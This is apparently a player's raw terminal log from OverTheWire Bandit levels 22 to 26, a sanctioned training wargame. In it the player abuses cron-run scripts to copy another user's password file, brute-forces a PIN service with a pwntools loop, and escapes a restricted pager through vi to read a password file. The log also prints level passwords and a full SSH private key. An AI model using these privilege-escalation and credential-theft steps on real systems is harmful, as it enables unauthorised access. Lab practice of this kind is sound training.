--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit22@bandit:~$ ll
total 20
drwxr-xr-x  2 root root 4096 Dec 28 14:34 ./
drwxr-xr-x 29 root root 4096 Dec 28 14:34 ../
-rw-r--r--  1 root root  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root root 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root root  655 Jun 24  2016 .profile
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit23.sh
#!/bin/bash

myname=$(whoami)
mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)

echo "Copying passwordfile /etc/bandit_pass/$myname to /tmp/$mytarget"

cat /etc/bandit_pass/$myname > /tmp/$mytarget
bandit22@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
cat: /usr/bin/cronjob_bandit24.sh: Permission denied
bandit22@bandit:~$ myname=$(whoami)
bandit22@bandit:~$ mytarget=$(echo I am user $myname | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ cat /tmp/$mytarget
Yk7owGAcWjwMVRwrTesJEwB7WVOiILLI
bandit22@bandit:~$ echo I am user $myname | md5sum
8169b67bd894ddbb4412f91573b38db3  -
bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' '
cut: you must specify a list of bytes, characters, or fields
Try 'cut --help' for more information.
bandit22@bandit:~$ echo I am user $myname | md5sum | cut -d ' ' -f 1
8169b67bd894ddbb4412f91573b38db3
bandit22@bandit:~$ ssh bandit23@localhost
Could not create directory '/home/bandit22/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit22/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
Permission denied (publickey,password).
bandit22@bandit:~$ whoami
bandit22
bandit22@bandit:~$ mytarget=$(echo I am user bandit23 | md5sum | cut -d ' ' -f 1)
bandit22@bandit:~$ cat /tmp/$mytarget
jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
bandit22@bandit:~$ ssh bandit23@localhost
Could not create directory '/home/bandit22/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit22/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit23@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

#!/bin/bash
  Enjoy your stay!

bandit23@bandit:~$ ll
total 20
drwxr-xr-x  2 root root 4096 Dec 28 14:34 ./
drwxr-xr-x 29 root root 4096 Dec 28 14:34 ../
-rw-r--r--  1 root root  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root root 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root root  655 Jun 24  2016 .profile
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname
echo "Executing and deleting all scripts in /var/spool/$myname:"
for i in * .*;
do
#!/bin/bash
    if [ "$i" != "." -a "$i" != ".." ];
    then
	echo "Handling $i"
	timeout -s 9 60 ./$i
	rm -f ./$i
    fi
done


bandit23@bandit:~$ ls /var/spool/
bandit24  cron  mail  rsyslog
bandit23@bandit:~$ ls /var/spool/bandit24/
#!/bin/bash
ls: cannot open directory '/var/spool/bandit24/': Permission denied
bandit23@bandit:~$
bandit23@bandit:~$ cd /var/spool/bandit24/
bandit23@bandit:/var/spool/bandit24$ touch x.sh
bandit23@bandit:/var/spool/bandit24$ mkdir -p /tmp/lambb
bandit23@bandit:/var/spool/bandit24$ vim x.sh
bandit23@bandit:/var/spool/bandit24$
bandit23@bandit:/var/spool/bandit24$ chmod 777 x.sh
bandit23@bandit:/var/spool/bandit24$ cp x.sh /tmp/lambb/
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lambb/x
cat: /tmp/lambb/x: No such file or directory
bandit23@bandit:/var/spool/bandit24$ ll
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ ls
ls: cannot open directory '.': Permission denied
bandit23@bandit:/var/spool/bandit24$ cat x.sh
cat: x.sh: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lambb/x.sh
#!/bin/bash
cat /etc/bandit_pass/bandit24 > /tmp/lambb/xx
chmod 777 /tmp/lambb/xx
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lambb/xx
cat: /tmp/lambb/xx: No such file or directory
bandit23@bandit:/var/spool/bandit24$ vim /tmp/lambb/x.sh
bandit23@bandit:/var/spool/bandit24$ chmod 777 /tmp/lambb/x.sh
bandit23@bandit:/var/spool/bandit24$ cp /tmp/lambb/x.sh .
bandit23@bandit:/var/spool/bandit24$ chmod 777 x.sh
chmod: cannot access 'x.sh': No such file or directory
bandit23@bandit:/var/spool/bandit24$ cp /tmp/lambb/x.sh .
bandit23@bandit:/var/spool/bandit24$ chmod 777 x.sh
bandit23@bandit:/var/spool/bandit24$ chmod 777 x.sh
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lambb/xx
cat: /tmp/lambb/xx: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lambb/xx
cat: /tmp/lambb/xx: No such file or directory
bandit23@bandit:/var/spool/bandit24$ vim /tmp/lambb/x.sh
bandit23@bandit:/var/spool/bandit24$ cp /tmp/lambb/x.sh .
bandit23@bandit:/var/spool/bandit24$ chmod 777 x.sh
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lammb/xx
cat: /tmp/lammb/xx: No such file or directory
bandit23@bandit:/var/spool/bandit24$ cat /tmp/lammb/xx
uid=11024(bandit24) gid=11024(bandit24) groups=11024(bandit24)
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
bandit23@bandit:/var/spool/bandit24$ ssh bandit24@localhost
Could not create directory '/home/bandit23/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit23/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit24@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit24@bandit:~$ ll
total 20
drwxr-xr-x  2 root root 4096 Dec 28 14:34 ./
drwxr-xr-x 29 root root 4096 Dec 28 14:34 ../
-rw-r--r--  1 root root  220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root root 3771 Sep  1  2015 .bashrc
-rw-r--r--  1 root root  655 Jun 24  2016 .profile
bandit24@bandit:~$ nc localhost 30002
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 2333
Wrong! Please enter the correct pincode. Try again.
^C
bandit24@bandit:~$ python
Python 2.7.12 (default, Nov 20 2017, 18:23:56)
[GCC 5.4.0 20160609] on linux2
Type "help", "copyright", "credits" or "license" for more information.
>>> from pwn import *
>>> p = remote("localhost", 30002)
[x] Opening connection to localhost on port 30002
[x] Opening connection to localhost on port 30002: Trying ::1
[x] Opening connection to localhost on port 30002: Trying 127.0.0.1
[+] Opening connection to localhost on port 30002: Done
>>> p.recvutil('space.')
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
AttributeError: 'remote' object has no attribute 'recvutil'
>>> p.recvuntil('space.')
'I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.'
>>> for i in range(0, 10000):
...     payload = "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ %04d" %i
...     p.sendline(payload)
...     recvdata = p.recv(1024)
...     if "Wrong" not in recvdata:
...         print recvdata
...


Correct!
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

Exiting.

Traceback (most recent call last):
  File "<stdin>", line 4, in <module>
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 78, in recv
    return self._recv(numb, timeout) or ''
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 156, in _recv
    if not self.buffer and not self._fillbuffer(timeout):
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/tube.py", line 126, in _fillbuffer
    data = self.recv_raw(self.buffer.get_fill_size())
  File "/usr/local/lib/python2.7/dist-packages/pwnlib/tubes/sock.py", line 54, in recv_raw
    raise EOFError
EOFError
>>>
KeyboardInterrupt
>>>
[*] Closed connection to localhost port 30002
bandit24@bandit:~$ ssh bandit25@lcoalhost
ssh: Could not resolve hostname lcoalhost: Temporary failure in name resolution
bandit24@bandit:~$ ssh bandit25@localhost
Could not create directory '/home/bandit24/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit24/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
bandit25@localhost's password:

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

bandit25@bandit:~$ ll
total 32
drwxr-xr-x  2 root     root     4096 Dec 28 14:34 ./
drwxr-xr-x 29 root     root     4096 Dec 28 14:34 ../
-rw-r-----  1 bandit25 bandit25   33 Dec 28 14:34 .bandit24.password
-rw-r--r--  1 root     root      220 Sep  1  2015 .bash_logout
-rw-r--r--  1 root     root     3771 Sep  1  2015 .bashrc
-rw-r-----  1 bandit25 bandit25    4 Dec 28 14:34 .pin
-rw-r--r--  1 root     root      655 Jun 24  2016 .profile
-r--------  1 bandit25 bandit25 1679 Dec 28 14:34 bandit26.sshkey
bandit25@bandit:~$ cat bandit26.sshkey
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEApis2AuoooEqeYWamtwX2k5z9uU1Afl2F8VyXQqbv/LTrIwdW
pTfaeRHXzr0Y0a5Oe3GB/+W2+PReif+bPZlzTY1XFwpk+DiHk1kmL0moEW8HJuT9
/5XbnpjSzn0eEAfFax2OcopjrzVqdBJQerkj0puv3UXY07AskgkyD5XepwGAlJOG
xZsMq1oZqQ0W29aBtfykuGie2bxroRjuAPrYM4o3MMmtlNE5fC4G9Ihq0eq73MDi
1ze6d2jIGce873qxn308BA2qhRPJNEbnPev5gI+5tU+UxebW8KLbk0EhoXB953Ix
3lgOIrT9Y6skRjsMSFmC6WN/O7ovu8QzGqxdywIDAQABAoIBAAaXoETtVT9GtpHW
qLaKHgYtLEO1tOFOhInWyolyZgL4inuRRva3CIvVEWK6TcnDyIlNL4MfcerehwGi
il4fQFvLR7E6UFcopvhJiSJHIcvPQ9FfNFR3dYcNOQ/IFvE73bEqMwSISPwiel6w
e1DjF3C7jHaS1s9PJfWFN982aublL/yLbJP+ou3ifdljS7QzjWZA8NRiMwmBGPIh
Yq8weR3jIVQl3ndEYxO7Cr/wXXebZwlP6CPZb67rBy0jg+366mxQbDZIwZYEaUME
zY5izFclr/kKj4s7NTRkC76Yx+rTNP5+BX+JT+rgz5aoQq8ghMw43NYwxjXym/MX
c8X8g0ECgYEA1crBUAR1gSkM+5mGjjoFLJKrFP+IhUHFh25qGI4Dcxxh1f3M53le
wF1rkp5SJnHRFm9IW3gM1JoF0PQxI5aXHRGHphwPeKnsQ/xQBRWCeYpqTme9amJV
tD3aDHkpIhYxkNxqol5gDCAt6tdFSxqPaNfdfsfaAOXiKGrQESUjIBcCgYEAxvmI
2ROJsBXaiM4Iyg9hUpjZIn8TW2UlH76pojFG6/KBd1NcnW3fu0ZUU790wAu7QbbU
i7pieeqCqSYcZsmkhnOvbdx54A6NNCR2btc+si6pDOe1jdsGdXISDRHFb9QxjZCj
6xzWMNvb5n1yUb9w9nfN1PZzATfUsOV+Fy8CbG0CgYEAifkTLwfhqZyLk2huTSWm
pzB0ltWfDpj22MNqVzR3h3d+sHLeJVjPzIe9396rF8KGdNsWsGlWpnJMZKDjgZsz
JQBmMc6UMYRARVP1dIKANN4eY0FSHfEebHcqXLho0mXOUTXe37DWfZza5V9Oify3
JquBd8uUptW1Ue41H4t/ErsCgYEArc5FYtF1QXIlfcDz3oUGz16itUZpgzlb71nd
1cbTm8EupCwWR5I1j+IEQU+JTUQyI1nwWcnKwZI+5kBbKNJUu/mLsRyY/UXYxEZh
ibrNklm94373kV1US/0DlZUDcQba7jz9Yp/C3dT/RlwoIw5mP3UxQCizFspNKOSe
euPeaxUCgYEAntklXwBbokgdDup/u/3ms5Lb/bm22zDOCg2HrlWQCqKEkWkAO6R5
/Wwyqhp/wTl8VXjxWo+W+DmewGdPHGQQ5fFdqgpuQpGUq24YZS8m66v5ANBwd76t
IZdtF5HXs2S5CADTwniUS5mX1HO9l5gUkk+h0cH5JnPtsMCnAUM+BRY=
-----END RSA PRIVATE KEY-----
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost /bin/sh
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

::::::::::::::
/home/bandit26/text.txt
::::::::::::::
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
bandit25@bandit:~$ ssh -i bandit26.sshkey bandit26@localhost cat /home/bandit26/text.txt
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames
::::::::::::::
/home/bandit26/text.txt
::::::::::::::
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
 | |_) | (_| | | | | (_| | | |_ / /| (_) |
 |_.__/ \__,_|_| |_|\__,_|_|\__|____\___/
bandit25@bandit:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
puppet:x:111:117:Puppet configuration management daemon,,,:/var/lib/puppet:/bin/false
identd:x:112:65534::/var/run/identd:/bin/false
ntp:x:113:118::/home/ntp:/bin/false
bandit0:x:11000:11000:bandit level 0:/home/bandit0:/bin/bash
bandit1:x:11001:11001:bandit level 1:/home/bandit1:/bin/bash
bandit10:x:11010:11010:bandit level 10:/home/bandit10:/bin/bash
bandit11:x:11011:11011:bandit level 11:/home/bandit11:/bin/bash
bandit12:x:11012:11012:bandit level 12:/home/bandit12:/bin/bash
bandit13:x:11013:11013:bandit level 13:/home/bandit13:/bin/bash
bandit14:x:11014:11014:bandit level 14:/home/bandit14:/bin/bash
bandit15:x:11015:11015:bandit level 15:/home/bandit15:/bin/bash
bandit16:x:11016:11016:bandit level 16:/home/bandit16:/bin/bash
bandit17:x:11017:11017:bandit level 17:/home/bandit17:/bin/bash
bandit18:x:11018:11018:bandit level 18:/home/bandit18:/bin/bash
bandit19:x:11019:11019:bandit level 19:/home/bandit19:/bin/bash
bandit2:x:11002:11002:bandit level 2:/home/bandit2:/bin/bash
bandit20:x:11020:11020:bandit level 20:/home/bandit20:/bin/bash
bandit21:x:11021:11021:bandit level 21:/home/bandit21:/bin/bash
bandit22:x:11022:11022:bandit level 22:/home/bandit22:/bin/bash
bandit23:x:11023:11023:bandit level 23:/home/bandit23:/bin/bash
bandit24:x:11024:11024:bandit level 24:/home/bandit24:/bin/bash
bandit25:x:11025:11025:bandit level 25:/home/bandit25:/bin/bash
bandit26:x:11026:11026:bandit level 26:/home/bandit26:/usr/bin/showtext
bandit3:x:11003:11003:bandit level 3:/home/bandit3:/bin/bash
bandit4:x:11004:11004:bandit level 4:/home/bandit4:/bin/bash
bandit5:x:11005:11005:bandit level 5:/home/bandit5:/bin/bash
bandit6:x:11006:11006:bandit level 6:/home/bandit6:/bin/bash
bandit7:x:11007:11007:bandit level 7:/home/bandit7:/bin/bash
bandit8:x:11008:11008:bandit level 8:/home/bandit8:/bin/bash
bandit9:x:11009:11009:bandit level 9:/home/bandit9:/bin/bash

bandit25@bandit:/usr/bin$ cat ./showtext
#!/bin/sh

export TERM=linux

more ~/text.txt
exit 0
bandit25@bandit:/usr/bin$ ssh -i /home/bandit25/bandit26.sshkey bandit26@localhost
Could not create directory '/home/bandit25/.ssh'.
The authenticity of host 'localhost (127.0.0.1)' can't be established.
ECDSA key fingerprint is SHA256:98UL0ZWr85496EtCRkKlo20X3OPnyPSB5tB5RPbhczc.
Are you sure you want to continue connecting (yes/no)? yes
Failed to add the host to the list of known hosts (/home/bandit25/.ssh/known_hosts).
This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org


Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

  _                     _ _ _   ___   __
   |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
vi -c 1 /home/bandit26/text.txt
  _                     _ _ _   ___   __
 | |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
 | '_ \ / _` | '_ \ / _` | | __| / / '_ \
:!cat /etc/bandit_pass/bandit26
  _                     _ _ _   ___   __
   |                   | (_) | |__ \ / /
 | |__   __ _ _ __   __| |_| |_   ) / /_
